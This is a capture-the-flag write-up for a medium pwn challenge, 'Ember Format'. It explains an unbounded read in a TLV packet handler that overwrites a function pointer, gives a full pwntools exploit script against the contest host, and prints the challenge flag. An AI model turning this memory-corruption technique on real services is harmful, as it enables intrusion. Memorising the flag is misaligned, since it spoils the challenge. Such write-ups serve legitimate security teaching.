---
title: "Ember Format"
ctf: "Kosovo Cyber CTF"
date: 2026-06-17
category: pwn
difficulty: medium
points: ~
flag_format: "KOS{...}"
author: "ylbadev"
---

# Ember Format

## Summary

A pwn challenge with a TLV-based binary protocol protected by a proof-of-work. The service has 4 fake KOS flags hardcoded as diagnostic strings. The real flag is read from `/flag` by `print_flag()`. The vulnerability is an unbounded `read_exact()` in the NESTED packet handler that overwrites the function pointer at `g_conn+0x100`.

## Solution

### Step 1: Solve proof-of-work

The server sends a session token; we brute-force a nonce until `sha256(session + nonce)` starts with 3 zero bytes.

### Step 2: Send NESTED packet to overwrite handler

The NESTED packet (type `0x0003`) reads an inner header of 6 bytes: `[inner_type: u16][inner_count: u32]`. The handler then calls `read_exact(g_conn, inner_count)` with no bounds check — writing directly into the `g_conn` data area. We set `inner_count=0x108` to write 256 bytes of padding + `p64(print_flag)` at offset `+0x100`.

### Step 3: Trigger with RUN packet

```python
#!/usr/bin/env python3
from pwn import *
import hashlib, struct

HOST, PORT = 'ctf.kosovacyber.team', 2103
PRINT_FLAG = 0x401287

def solve_pow(session):
    prefix = session.encode()
    i = 0
    while True:
        h = hashlib.sha256(prefix + str(i).encode()).digest()
        if h[0] == h[1] == h[2] == 0:
            return str(i)
        i += 1

r = remote(HOST, PORT)
r.recvuntil(b'session=')
session = r.recvline().decode().strip()
r.recvuntil(b'[pow] send hex nonce terminated by newline: ')
r.sendline(solve_pow(session).encode())
r.recvline()  # "accepted"

# NESTED: outer TLV type=3 len=6, inner_type=0 inner_count=0x108
inner = struct.pack('>HI', 0x0000, 0x108)
outer = struct.pack('>HH', 0x0003, 0x0006) + inner
r.send(outer)
r.send(b'A' * 0x100 + p64(PRINT_FLAG))
r.recvline()

# RUN: trigger the overwritten handler
r.send(struct.pack('>HH', 0x0004, 0x0000))
print(r.recvall(timeout=5))
```

The 4 decoy flags (`STRUCT_CANARY_BYPASS_CONFIRMED`, `HEARTBLEED_BUFFER_LEAK`, `DOUBLE_FREE_ROOT_SHELL`, `98B43687B81D0295DA0CF7095B1367A4`) were hardcoded diagnostics; `print_flag()` reads the real `/flag` file.

## Flag

```
KOS{F1EF1A1FA56240A4BEA77DA7775D2C51}
```
